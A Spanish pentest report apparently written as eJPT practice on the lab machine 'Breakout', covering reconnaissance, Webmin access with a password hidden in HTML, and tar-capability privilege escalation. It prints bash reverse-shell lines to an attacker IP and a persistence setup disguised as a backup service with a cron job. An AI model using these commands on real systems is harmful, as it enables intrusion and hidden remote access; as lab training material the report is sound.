# Informe de Pentesting - Breakout

**Máquina:** Breakout
**Autor:** Klauss Reyes Granados
**Certificación:** Preparación eJPT

---

## 🎯 Objetivo

Evaluar y comprometer la máquina "Breakout" replicando un ataque de caja negra con foco en vulnerabilidades web y servicios remotos.

---

## 🛰️ Recolección de Información

* Descubrimiento IP:

  ```bash
  ifconfig
  arp-scan -I eth1 192.1.1.0/24
  ```

* Escaneo de puertos:

  ```bash
  nmap -p- -sV -sS -Pn -n 192.1.1.7
  ```

---

## 🔎 Enumeración de Servicios

### Puerto 80 - HTTP

* Página por defecto Apache en Debian.
* En el código fuente se encuentra una cadena codificada en Brainfuck:

  * Descifrada usando [copy.sh](https://copy.sh/brainfuck/) → `.2uqPEfj3D<P'a-3`

### Puerto 10000 - Webmin (HTTPS)

```bash
dirb https://192.1.1.7:10000
```

### Puerto 20000 - Segundo Webmin (HTTPS)

```bash
dirb https://192.1.1.7:20000
```

### Puerto 139/445 - Samba

* Enumeración con:

  ```bash
  smbmap -H 192.1.1.7
  rpcclient -U "" -N 192.1.1.7
  enum4linux 192.1.1.7
  ```
* Se detecta usuario: `cyber`

---

## 💥 Explotación

* Se accede a Webmin en el puerto 20000 con:

  * Usuario: `cyber`
  * Contraseña descifrada desde el código Brainfuck

* Uso del terminal web para ejecutar reverse shell:

```bash
bash -i >& /dev/tcp/192.1.1.4/8000 0>&1
```

* Conexión exitosa usando `nc -nlvp 8000`

---

## ⬆️ Escalado de Privilegios

### Vía capacidades en binario `tar`

```bash
getcap -r / 2>/dev/null
```

* Lectura de archivo root restringido:

```bash
tar xf /var/backups/.old_pass.bak --to-command='cat'
```

* Se obtiene contraseña: `Ts&4&YurgtRX(=~h`
* Acceso como `root`:

```bash
su root
```

---

## 🧠 Post-Explotación - Persistencia

* Script Bash:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.1.1.4/21000 0>&1
```

* Servicio:

```ini
[Unit]
Description=Servicio de gestión de backups

[Service]
ExecStart=/usr/bin/backups.sh

[Install]
WantedBy=multi-user.target
```

* Cron job:

```bash
* * * * * systemctl start Backup.service
```

---

## 🚨 Vulnerabilidades Detectadas

| ID | Vulnerabilidad                         | Nivel   | Recomendación                                                |
| -- | -------------------------------------- | ------- | ------------------------------------------------------------ |
| 1  | Contraseña visible en HTML (brainfuck) | Alto    | No incluir datos sensibles en el código fuente               |
| 2  | Acceso anónimo a Samba                 | Medio   | Restringir acceso con autenticación                          |
| 3  | Ejecución de comandos vía Webmin       | Alto    | Actualizar y limitar Webmin                                  |
| 4  | Password root expuesta en backups      | Crítico | Eliminar ficheros antiguos y revisar capacidades de binarios |

---

## ✅ Conclusiones

* La intrusión fue posible gracias a la mala práctica de dejar datos sensibles en el HTML.
* El abuso de capacidades en binarios como `tar` permitió escalar hasta root.
* Se estableció persistencia con servicios y cronjobs personalizados.

> Informe elaborado como parte de la práctica intensiva para el eJPT.
